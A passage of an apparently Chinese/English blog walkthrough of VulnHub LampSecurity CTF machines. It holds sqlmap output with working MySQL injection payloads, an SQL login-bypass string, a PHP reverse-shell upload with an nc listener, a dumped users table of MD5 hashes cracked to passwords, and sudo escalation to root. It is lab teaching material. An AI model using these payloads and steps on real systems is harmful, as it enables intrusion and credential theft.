dynamic[15:16:58] [INFO] heuristic (basic) test shows that POST parameter &#x27;name&#x27; might be injectable (possible DBMS: &#x27;MySQL&#x27;)[15:16:58] [INFO] heuristic (XSS) test shows that POST parameter &#x27;name&#x27; might be vulnerable to cross-site scripting (XSS) attacks[15:16:58] [INFO] testing for SQL injection on POST parameter &#x27;name&#x27;it looks like the back-end DBMS is &#x27;MySQL&#x27;. Do you want to skip test payloads specific for other DBMSes? [Y/n] for the remaining tests, do you want to include all tests for &#x27;MySQL&#x27; extending provided level (1) and risk (1) values? [Y/n] [15:17:06] [INFO] testing &#x27;AND boolean-based blind - WHERE or HAVING clause&#x27;[15:17:06] [WARNING] reflective value(s) found and filtering out[15:17:06] [INFO] testing &#x27;Boolean-based blind - Parameter replace (original value)&#x27;[15:17:06] [INFO] testing &#x27;Generic inline queries&#x27;[15:17:06] [INFO] testing &#x27;AND boolean-based blind - WHERE or HAVING clause (MySQL comment)&#x27;[15:17:06] [INFO] testing &#x27;OR boolean-based blind - WHERE or HAVING clause (MySQL comment)&#x27;[15:17:07] [INFO] testing &#x27;OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)&#x27;[15:17:07] [INFO] testing &#x27;MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause&#x27;                                                                                        [15:17:07] [INFO] POST parameter &#x27;name&#x27; appears to be &#x27;MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause&#x27; injectable (with --string=&quot;to&quot;)                            [15:17:07] [INFO] testing &#x27;MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)&#x27;                                                                         [15:17:07] [INFO] testing &#x27;MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)&#x27;                                                                                              [15:17:07] [INFO] testing &#x27;MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)&#x27;                                                                                     [15:17:07] [INFO] testing &#x27;MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (EXP)&#x27;[15:17:07] [INFO] testing &#x27;MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)&#x27;                                                                             [15:17:07] [INFO] testing &#x27;MySQL &gt;= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)&#x27;[15:17:07] [INFO] testing &#x27;MySQL &gt;= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)&#x27;                                                                             [15:17:07] [INFO] testing &#x27;MySQL &gt;= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)&#x27;[15:17:07] [INFO] testing &#x27;MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)&#x27;                                                                                   [15:17:07] [INFO] testing &#x27;MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)&#x27;                                                                                    [15:17:07] [INFO] testing &#x27;MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)&#x27;                                                                            [15:17:07] [INFO] testing &#x27;MySQL &gt;= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)&#x27;                                                                             [15:17:07] [INFO] testing &#x27;MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)&#x27;                                                                               [15:17:07] [INFO] testing &#x27;MySQL &gt;= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)&#x27;                                                                                [15:17:07] [INFO] testing &#x27;MySQL &gt;= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)&#x27;                                                                                   [15:17:07] [INFO] POST parameter &#x27;name&#x27; is &#x27;MySQL &gt;= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)&#x27; injectable                                                       [15:17:07] [INFO] testing &#x27;MySQL inline queries&#x27;[15:17:07] [INFO] testing &#x27;MySQL &gt;= 5.0.12 stacked queries (comment)&#x27;[15:17:07] [INFO] testing &#x27;MySQL &gt;= 5.0.12 stacked queries&#x27;[15:17:07] [INFO] testing &#x27;MySQL &gt;= 5.0.12 stacked queries (query SLEEP - comment)&#x27;[15:17:07] [INFO] testing &#x27;MySQL &gt;= 5.0.12 stacked queries (query SLEEP)&#x27;[15:17:07] [INFO] testing &#x27;MySQL &lt; 5.0.12 stacked queries (BENCHMARK - comment)&#x27;[15:17:07] [INFO] testing &#x27;MySQL &lt; 5.0.12 stacked queries (BENCHMARK)&#x27;[15:17:07] [INFO] testing &#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27;[15:17:17] [INFO] POST parameter &#x27;name&#x27; appears to be &#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27; injectable                                                                           [15:17:17] [INFO] testing &#x27;Generic UNION query (NULL) - 1 to 20 columns&#x27;[15:17:17] [INFO] testing &#x27;MySQL UNION query (NULL) - 1 to 20 columns&#x27;[15:17:17] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found[15:17:17] [INFO] testing &#x27;MySQL UNION query (random number) - 1 to 20 columns&#x27;[15:17:17] [INFO] testing &#x27;MySQL UNION query (NULL) - 21 to 40 columns&#x27;[15:17:18] [INFO] testing &#x27;MySQL UNION query (random number) - 21 to 40 columns&#x27;[15:17:18] [INFO] testing &#x27;MySQL UNION query (NULL) - 41 to 60 columns&#x27;[15:17:18] [INFO] testing &#x27;MySQL UNION query (random number) - 41 to 60 columns&#x27;[15:17:18] [INFO] testing &#x27;MySQL UNION query (NULL) - 61 to 80 columns&#x27;[15:17:18] [INFO] testing &#x27;MySQL UNION query (random number) - 61 to 80 columns&#x27;[15:17:18] [INFO] testing &#x27;MySQL UNION query (NULL) - 81 to 100 columns&#x27;[15:17:18] [INFO] testing &#x27;MySQL UNION query (random number) - 81 to 100 columns&#x27;POST parameter &#x27;name&#x27; is vulnerable. Do you want to keep testing the others (if any)? [y/N] sqlmap identified the following injection point(s) with a total of 396 HTTP(s) requests:---Parameter: name (POST)    Type: boolean-based blind    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: name=1&#x27; RLIKE (SELECT (CASE WHEN (3453=3453) THEN 1 ELSE 0x28 END))-- fkrZ&amp;email=&amp;phone=&amp;org=    Type: error-based    Title: MySQL &gt;= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)    Payload: name=1&#x27; AND ROW(9202,7421)&gt;(SELECT COUNT(*),CONCAT(0x716b766271,(SELECT (ELT(9202=9202,1))),0x7171627a71,FLOOR(RAND(0)*2))x FROM (SELECT 5809 UNION SELECT 6254 UNION SELECT 2907 UNION SELECT 3295)a GROUP BY x)-- lorR&amp;email=&amp;phone=&amp;org=    Type: time-based blind    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)    Payload: name=1&#x27; AND (SELECT 6598 FROM (SELECT(SLEEP(5)))WnCm)-- cXmx&amp;email=&amp;phone=&amp;org=---[15:17:23] [INFO] the back-end DBMS is MySQLweb server operating system: Linux Fedora 6 or 8 or 7 (Moonshine or Zod or Werewolf)web application technology: Apache 2.2.6, PHP 5.2.4back-end DBMS: MySQL &gt;= 4.1[15:17:23] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/192.168.56.139&#x27;                                                                                     [*] ending @ 15:17:23 /2023-04-27/\n\n可惜获得的凭证只能用于登录blog页面，并不能登录后台以及ssh连接，价值不大。\n","categories":["vulnhub"],"tags":["walkthrough"]},{"title":"[vulnhub]  LampSec-CTF7","url":"/2023/05/23/LampSec-CTF7/","content":"\n\n\n靶机部署这台机子将其网卡设置为eth0。实际上的网卡是eth1。因此，我们需要删除配置文件&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eth0，并创建一个名为ifcfg-eth1的新文件。必须写在文件中的设置是ONBOOT=yes BOOTPROTO=dhcp DEVICE=eth1 #要配置的网卡名。然后service network restart就可以了。(在Cent OS 6中, 在大于等于7的版本应该使用systemctl)其实之后最好把靶机丢到vm里面选择已经移动别选复制，这样容易保障网络环境配置不出问题。\n信息收集┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf7/workSpace]└─$ sudo nmap -sn 192.168.56.0/24[sudo] password for kali: Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-02 20:29 CSTNmap scan report for 192.168.56.1Host is up (0.0014s latency).MAC Address: 00:50:56:C0:00:08 (VMware)Nmap scan report for 192.168.56.2Host is up (0.0010s latency).MAC Address: 00:50:56:EC:CE:9E (VMware)Nmap scan report for 192.168.56.141Host is up (0.00089s latency).MAC Address: 00:0C:29:AC:12:E4 (VMware)Nmap scan report for 192.168.56.254Host is up (0.00060s latency).MAC Address: 00:50:56:E6:06:A3 (VMware)Nmap scan report for 192.168.56.132Host is up.Nmap done: 256 IP addresses (5 hosts up) scanned in 2.02 seconds\n\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf7/workSpace]└─$ sudo nmap -p- --min-rate=10000 192.168.56.141Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-02 20:30 CSTNmap scan report for 192.168.56.141Host is up (0.0011s latency).Not shown: 65507 filtered tcp ports (no-response), 19 filtered tcp ports (host-prohibited)PORT      STATE  SERVICE22/tcp    open   ssh80/tcp    open   http137/tcp   closed netbios-ns138/tcp   closed netbios-dgm139/tcp   open   netbios-ssn901/tcp   open   samba-swat5900/tcp  closed vnc8080/tcp  open   http-proxy10000/tcp open   snet-sensor-mgmtMAC Address: 00:0C:29:AC:12:E4 (VMware)Nmap done: 1 IP address (1 host up) scanned in 13.48 seconds\n\n还开了挺多端口的，80，8080，139，10000都可以看看。\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf7/workSpace]└─$ sudo nmap -sU -p- --min-rate=10000 192.168.56.141Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-02 20:39 CSTWarning: 192.168.56.141 giving up on port because retransmission cap hit (10).Nmap scan report for 192.168.56.141Host is up (0.0019s latency).All 65535 scanned ports on 192.168.56.141 are in ignored states.Not shown: 65457 open|filtered udp ports (no-response), 78 filtered udp ports (host-prohibited)MAC Address: 00:0C:29:AC:12:E4 (VMware)Nmap done: 1 IP address (1 host up) scanned in 72.81 seconds\n\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf7/workSpace]└─$ sudo nmap -sT -sV -O -p22,80,137,138,139,901,5900,8080,10000 192.168.56.141Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-02 20:47 CSTNmap scan report for 192.168.56.141Host is up (0.00058s latency).PORT      STATE  SERVICE     VERSION22/tcp    open   ssh         OpenSSH 5.3 (protocol 2.0)80/tcp    open   http        Apache httpd 2.2.15 ((CentOS))137/tcp   closed netbios-ns138/tcp   closed netbios-dgm139/tcp   open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)901/tcp   open   http        Samba SWAT administration server5900/tcp  closed vnc8080/tcp  open   http        Apache httpd 2.2.15 ((CentOS))10000/tcp open   http        MiniServ 1.610 (Webmin httpd)MAC Address: 00:0C:29:AC:12:E4 (VMware)Device type: general purposeRunning: Linux 2.6.X|3.XOS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3OS details: Linux 2.6.32 - 3.13Network Distance: 1 hopOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 43.12 seconds\n\n趁其它还在扫描的时间先看看80端口吧。\nEXPLOITweb先目录发现一下，扫描的同时自己手动看看网页。\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf7/workSpace]└─$ sudo dirb http://192.168.56.141                                                                                [sudo] password for kali: -----------------DIRB v2.22    By The Dark Raver-----------------START_TIME: Tue May  2 22:34:27 2023URL_BASE: http://192.168.56.141/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt-----------------\n\n随便点点，发现有几个可以输入注册的地方，以及8080端口是个登录页面。\nSQLi加点&#39;看看有何反应。OK，存在sql注入漏洞。之后看看是否用sqlmap把库dump出来看看。再在登录页面试试。\n# 192.168.56.141:8080admin&#x27;) or 1=1 #-- -\n\n竟然直接登进来了。\n文件上传ok，不过一时间看不出是什么cms，那就找找有无什么可以上传文件的地方呗。Fortunetly, we find the way to upload files.We try our PoC of upload vuln.Seems that the &lt;?and?&gt; are filtered. However, even if we try to bypass the filter like &lt;sript language=&quot;php&quot;&gt;payload&lt;/script&gt;, the payload just doesn’t work.As a result, we must find the path of the uploaded shell.Oh, don’t forget we did web content discovery and it was done for sure. So let us take a look at it.\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf7/workSpace]└─$ sudo dirb http://192.168.56.141                                                                                [sudo] password for kali: -----------------DIRB v2.22    By The Dark Raver-----------------START_TIME: Tue May  2 22:34:27 2023URL_BASE: http://192.168.56.141/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt-----------------GENERATED WORDS: 4612                                                          ---- Scanning URL: http://192.168.56.141/ ----+ http://192.168.56.141/about (CODE:200|SIZE:4910)                                                                          ==&gt; DIRECTORY: http://192.168.56.141/assets/                                                                                + http://192.168.56.141/backups (CODE:301|SIZE:333)                                                                         + http://192.168.56.141/cgi-bin/ (CODE:403|SIZE:290)                                                                        + http://192.168.56.141/contact (CODE:200|SIZE:5017)                                                                        ==&gt; DIRECTORY: http://192.168.56.141/css/                                                                                   + http://192.168.56.141/db (CODE:200|SIZE:3904)                                                                             + http://192.168.56.141/default (CODE:200|SIZE:6058)                                                                        + http://192.168.56.141/footer (CODE:200|SIZE:3904)                                                                         + http://192.168.56.141/header (CODE:200|SIZE:3904)                                                                         ==&gt; DIRECTORY: http://192.168.56.141/img/                                                                                   ==&gt; DIRECTORY: http://192.168.56.141/inc/                                                                                   + http://192.168.56.141/index.php (CODE:200|SIZE:6058)                                                                      ==&gt; DIRECTORY: http://192.168.56.141/js/                                                                                    + http://192.168.56.141/newsletter (CODE:200|SIZE:4037)                                                                     + http://192.168.56.141/phpinfo (CODE:200|SIZE:58762)                                                                       + http://192.168.56.141/profile (CODE:200|SIZE:3977)                                                                        + http://192.168.56.141/read (CODE:302|SIZE:1)                                                                              + http://192.168.56.141/recovery (CODE:200|SIZE:4807)                                                                       + http://192.168.56.141/register (CODE:200|SIZE:6591)                                                                       + http://192.168.56.141/signup (CODE:200|SIZE:4783)                                                                         + http://192.168.56.141/usage (CODE:403|SIZE:287)                                                                           ==&gt; DIRECTORY: http://192.168.56.141/webalizer/                                                                             ==&gt; DIRECTORY: http://192.168.56.141/webmail/                                                                                                                                                                                                           ---- Entering directory: http://192.168.56.141/assets/ ----(!) WARNING: Directory IS LISTABLE. No need to scan it.                            (Use mode &#x27;-w&#x27; if you want to scan it anyway)                                                                                                                            ---- Entering directory: http://192.168.56.141/css/ ----(!) WARNING: Directory IS LISTABLE. No need to scan it.                            (Use mode &#x27;-w&#x27; if you want to scan it anyway)                                                                                                                            ---- Entering directory: http://192.168.56.141/img/ ----(!) WARNING: Directory IS LISTABLE. No need to scan it.                            (Use mode &#x27;-w&#x27; if you want to scan it anyway)                                                                                                                            ---- Entering directory: http://192.168.56.141/inc/ ----(!) WARNING: Directory IS LISTABLE. No need to scan it.                            (Use mode &#x27;-w&#x27; if you want to scan it anyway)                                                                                                                            ---- Entering directory: http://192.168.56.141/js/ ----(!) WARNING: Directory IS LISTABLE. No need to scan it.                            (Use mode &#x27;-w&#x27; if you want to scan it anyway)                                                                                                                            ---- Entering directory: http://192.168.56.141/webalizer/ ----+ http://192.168.56.141/webalizer/index.html (CODE:200|SIZE:3671)                                                                                                                                                                                       ---- Entering directory: http://192.168.56.141/webmail/ ----+ http://192.168.56.141/webmail/bin (CODE:403|SIZE:293)                                                                     + http://192.168.56.141/webmail/config (CODE:403|SIZE:296)                                                                  + http://192.168.56.141/webmail/favicon.ico (CODE:200|SIZE:1150)                                                            + http://192.168.56.141/webmail/index.php (CODE:200|SIZE:5157)                                                              ==&gt; DIRECTORY: http://192.168.56.141/webmail/installer/                                                                     + http://192.168.56.141/webmail/LICENSE (CODE:403|SIZE:297)                                                                 + http://192.168.56.141/webmail/logs (CODE:403|SIZE:294)                                                                    ==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/                                                                       ==&gt; DIRECTORY: http://192.168.56.141/webmail/program/                                                                       + http://192.168.56.141/webmail/README (CODE:403|SIZE:296)                                                                  + http://192.168.56.141/webmail/robots.txt (CODE:200|SIZE:26)                                                               ==&gt; DIRECTORY: http://192.168.56.141/webmail/skins/                                                                         + http://192.168.56.141/webmail/SQL (CODE:403|SIZE:293)                                                                     + http://192.168.56.141/webmail/temp (CODE:403|SIZE:294)                                                                                                                                                                                                ---- Entering directory: http://192.168.56.141/webmail/installer/ ----==&gt; DIRECTORY: http://192.168.56.141/webmail/installer/images/                                                              + http://192.168.56.141/webmail/installer/index.php (CODE:302|SIZE:0)                                                                                                                                                                                   ---- Entering directory: http://192.168.56.141/webmail/plugins/ ----==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/archive/                                                               ==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/emoticons/                                                             ==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/help/                                                                  ==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/password/                                                              ==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/userinfo/                                                                                                                                                                                          ---- Entering directory: http://192.168.56.141/webmail/program/ ----(!) WARNING: All responses for this directory seem to be CODE = 403.                                                            (Use mode &#x27;-w&#x27; if you want to scan it anyway)                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/skins/ ----==&gt; DIRECTORY: http://192.168.56.141/webmail/skins/classic/                                                                                                                                                                                             ---- Entering directory: http://192.168.56.141/webmail/installer/images/ ----                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/plugins/archive/ ----==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/archive/skins/                                                                                                                                                                                     ---- Entering directory: http://192.168.56.141/webmail/plugins/emoticons/ ----                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/plugins/help/ ----==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/help/content/                                                          ==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/help/skins/                                                                                                                                                                                        ---- Entering directory: http://192.168.56.141/webmail/plugins/password/ ----==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/password/drivers/                                                      ==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/password/helpers/                                                      + http://192.168.56.141/webmail/plugins/password/README (CODE:200|SIZE:10645)                                                                                                                                                                           ---- Entering directory: http://192.168.56.141/webmail/plugins/userinfo/ ----                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/skins/classic/ ----==&gt; DIRECTORY: http://192.168.56.141/webmail/skins/classic/images/                                                          ==&gt; DIRECTORY: http://192.168.56.141/webmail/skins/classic/includes/                                                        + http://192.168.56.141/webmail/skins/classic/README (CODE:200|SIZE:855)                                                    ==&gt; DIRECTORY: http://192.168.56.141/webmail/skins/classic/templates/                                                                                                                                                                                   ---- Entering directory: http://192.168.56.141/webmail/plugins/archive/skins/ ----==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/archive/skins/classic/                                                                                                                                                                             ---- Entering directory: http://192.168.56.141/webmail/plugins/help/content/ ----                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/plugins/help/skins/ ----==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/help/skins/classic/                                                                                                                                                                                ---- Entering directory: http://192.168.56.141/webmail/plugins/password/drivers/ ----                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/plugins/password/helpers/ ----                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/skins/classic/images/ ----==&gt; DIRECTORY: http://192.168.56.141/webmail/skins/classic/images/buttons/                                                  ==&gt; DIRECTORY: http://192.168.56.141/webmail/skins/classic/images/display/                                                  + http://192.168.56.141/webmail/skins/classic/images/favicon.ico (CODE:200|SIZE:1150)                                       ==&gt; DIRECTORY: http://192.168.56.141/webmail/skins/classic/images/icons/                                                                                                                                                                                ---- Entering directory: http://192.168.56.141/webmail/skins/classic/includes/ ----                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/skins/classic/templates/ ----                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/plugins/archive/skins/classic/ ----                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/plugins/help/skins/classic/ ----==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/help/skins/classic/templates/                                                                                                                                                                      ---- Entering directory: http://192.168.56.141/webmail/skins/classic/images/buttons/ ----                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/skins/classic/images/display/ ----                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/skins/classic/images/icons/ ----                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/plugins/help/skins/classic/templates/ ----                                                                               /zt                                          -----------------END_TIME: Tue May  2 22:39:31 2023DOWNLOADED: 124624 - FOUND: 32\n\nAfter some munal try, we find out upload file in the path of 192.168.56.141/assets/.So we upload php-reverse-shell.And we curl our shell.php\n# curl http://192.168.56.141/assets/shell.php┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf7/workSpace]└─$ sudo nc -lvp 443                                                           [sudo] password for kali: listening on [any] 443 ...192.168.56.141: inverse host lookup failed: Host name lookup failureconnect to [192.168.56.132] from (UNKNOWN) [192.168.56.141] 48031Linux localhost.localdomain 2.6.32-279.el6.i686 #1 SMP Fri Jun 22 10:59:55 UTC 2012 i686 i686 i386 GNU/Linux 17:37:14 up  2:45,  0 users,  load average: 0.00, 0.00, 0.00USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHATuid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0sh: no job control in this shellsh-4.1$ whoamiwhoamiapachesh-4.1$ pwd/pwdsh-4.1$ ip aip a1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue state UNKNOWN     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00    inet 127.0.0.1/8 scope host lo    inet6 ::1/128 scope host        valid_lft forever preferred_lft forever2: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UNKNOWN qlen 1000    link/ether 00:0c:29:ac:12:e4 brd ff:ff:ff:ff:ff:ff    inet 192.168.56.141/24 brd 192.168.56.255 scope global eth1    inet6 fe80::20c:29ff:feac:12e4/64 scope link        valid_lft forever preferred_lft forever\n\nSucessfully get webshell.\nPrivilege Escalation先python spwan一个更稳定的shell。然后sudo -l需要密码，findsuid位文件没有能用的，cat /etc/crontab直接没有定时任务。OK。行吧，在上大招前先手工枚举一下吧。\nuname -a                                                                                     Linux localhost.localdomain 2.6.32-279.el6.i686 #1 SMP Fri Jun 22 10:59:55 UTC 2012 i686 i686 i386 GNU/Linux \n\n版本挺低的，还是经典2.6，可以考虑内核提权。但是优先级往后稍稍吧。\n配置文件查看cd到&#x2F;home目录下，发现很多用户，然而没有read权限，没用，查不了是否有用户遗留的登录凭证。那就看看网站配置文件啥的吧，找点前后端连接用到的密码。\nbash-4.1$ cat config.inc.phpcat config.inc.php&lt;?php/* * Generated configuration file * Generated by: phpMyAdmin 3.5.4 setup script * Date: Wed, 19 Dec 2012 09:01:38 -0500 *//* Servers configuration */$i = 0;/* Server: localhost [1] */$i++;$cfg[&#x27;Servers&#x27;][$i][&#x27;verbose&#x27;] = &#x27;localhost&#x27;;$cfg[&#x27;Servers&#x27;][$i][&#x27;host&#x27;] = &#x27;localhost&#x27;;$cfg[&#x27;Servers&#x27;][$i][&#x27;port&#x27;] = &#x27;&#x27;;$cfg[&#x27;Servers&#x27;][$i][&#x27;socket&#x27;] = &#x27;&#x27;;$cfg[&#x27;Servers&#x27;][$i][&#x27;connect_type&#x27;] = &#x27;tcp&#x27;;$cfg[&#x27;Servers&#x27;][$i][&#x27;extension&#x27;] = &#x27;mysqli&#x27;;$cfg[&#x27;Servers&#x27;][$i][&#x27;nopassword&#x27;] = true;$cfg[&#x27;Servers&#x27;][$i][&#x27;auth_type&#x27;] = &#x27;cookie&#x27;;$cfg[&#x27;Servers&#x27;][$i][&#x27;user&#x27;] = &#x27;root&#x27;;$cfg[&#x27;Servers&#x27;][$i][&#x27;password&#x27;] = &#x27;&#x27;;$cfg[&#x27;Servers&#x27;][$i][&#x27;AllowNoPassword&#x27;] = TRUE;$cfg[&#x27;Servers&#x27;][$i][&#x27;AllowNoPasswordRoot&#x27;] = TRUE; /* End of servers configuration */$cfg[&#x27;blowfish_secret&#x27;] = &#x27;50d1c8ba084fd9.39888691&#x27;;$cfg[&#x27;DefaultLang&#x27;] = &#x27;en&#x27;;$cfg[&#x27;ServerDefault&#x27;] = 1;$cfg[&#x27;UploadDir&#x27;] = &#x27;&#x27;;$cfg[&#x27;SaveDir&#x27;] = &#x27;&#x27;;\n\n从网站config文件我们可以看到，数据root用户登录直接不用密码。那我之后可以登录一下数据库找点信息。\n敏感信息泄露再手动遍历了下网页目录，发现之前进不去的&#x2F;backups目录有个备份文件。我们查看一下，刚好最后几行记录了向数据库插入用户的账号密码等信息。\n/* /var/www/html/backups */LOCK TABLES `users` WRITE;/*!40000 ALTER TABLE `users` DISABLE KEYS */;INSERT INTO `users` VALUES (&#x27;webdev@localhost.localdomain&#x27;,&#x27;f7aa6066f95255096672e3a5fc537081&#x27;,1,NULL,13,&#x27;Developer account&#x27;,&#x27;Developer account for updating the site.&#x27;),(&#x27;brian@localhost.localdomain&#x27;,&#x27;d41d8cd98f00b204e9800998ecf8427e&#x27;,1,&#x27;2012-12-19 11:30:54&#x27;,3,&#x27;Brian Hershel&#x27;,&#x27;Brian is our technical brains behind the operations and a chief trainer.&#x27;),(&#x27;john@localhost.localdomain&#x27;,&#x27;0d9ff2a4396d6939f80ffe09b1280ee1&#x27;,1,NULL,4,&#x27;John Durham&#x27;,&#x27;&#x27;),(&#x27;alice@localhost.localdomain&#x27;,&#x27;2146bf95e8929874fc63d54f50f1d2e3&#x27;,1,NULL,5,&#x27;Alice Wonder&#x27;,&#x27;&#x27;),(&#x27;ruby@localhost.localdomain&#x27;,&#x27;9f80ec37f8313728ef3e2f218c79aa23&#x27;,0,NULL,6,&#x27;Ruby Spinster&#x27;,&#x27;&#x27;),(&#x27;leon@localhost.localdomain&#x27;,&#x27;5d93ceb70e2bf5daa84ec3d0cd2c731a&#x27;,0,NULL,7,&#x27;Leon Parnetta&#x27;,&#x27;&#x27;),(&#x27;julia@localhost.localdomain&#x27;,&#x27;ed2539fe892d2c52c42a440354e8e3d5&#x27;,0,NULL,8,&#x27;Julia Fields&#x27;,&#x27;&#x27;),(&#x27;michael@localhost.localdomain&#x27;,&#x27;9c42a1346e333a770904b2a2b37fa7d3&#x27;,0,NULL,9,&#x27;Michael Saint&#x27;,&#x27;&#x27;),(&#x27;bruce@localhost.localdomain&#x27;,&#x27;3a24d81c2b9d0d9aaf2f10c6c9757d4e&#x27;,0,NULL,10,&#x27;Bruce Pottricks&#x27;,&#x27;&#x27;),(&#x27;neil@localhost.localdomain&#x27;,&#x27;4773408d5358875b3764db552a29ca61&#x27;,0,NULL,11,&#x27;Neil Felstein&#x27;,&#x27;&#x27;),(&#x27;charles@localhost.localdomain&#x27;,&#x27;b2a97bcecbd9336b98d59d9324dae5cf&#x27;,0,NULL,12,&#x27;Charles Adams&#x27;,&#x27;&#x27;);/*!40000 ALTER TABLE `users` ENABLE KEYS */;\n\n我们提取一下登录凭证，把哈希值丢到crackstation。然后用得到的密码尝试直接ssh看看能不能成功登录。\nbrain:&#x27;&#x27;#竟然是md5的空值，草。webdev:&#x27;webdev&#x27;john:&#x27;transformersrule&#x27;\n\n试到第3个john的时候就成功了。\nbash-4.1$ su johnsu johnPassword: transformersrule[john@localhost backups]$ whoamiwhoamijohn[john@localhost backups]$ sudo -lsudo -l[sudo] password for john: transformersruleMatching Defaults entries for john on this host:    requiretty, !visiblepw, always_set_home, env_reset, env_keep=&quot;COLORS    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS&quot;, env_keep+=&quot;MAIL PS1    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;, env_keep+=&quot;LC_COLLATE    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;, env_keep+=&quot;LC_MONETARY    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;, env_keep+=&quot;LC_TIME LC_ALL    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;,    secure_path=/sbin\\:/bin\\:/usr/sbin\\:/usr/binUser john may run the following commands on this host:    (ALL) ALL[john@localhost backups]$ sudo susudo su[root@localhost backups]# whoamiwhoamiroot[root@localhost backups]# ip aip a1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue state UNKNOWN     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00    inet 127.0.0.1/8 scope host lo    inet6 ::1/128 scope host        valid_lft forever preferred_lft forever2: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UNKNOWN qlen 1000    link/ether 00:0c:29:ac:12:e4 brd ff:ff:ff:ff:ff:ff    inet 192.168.56.141/24 brd 192.168.56.255 scope global eth1    inet6 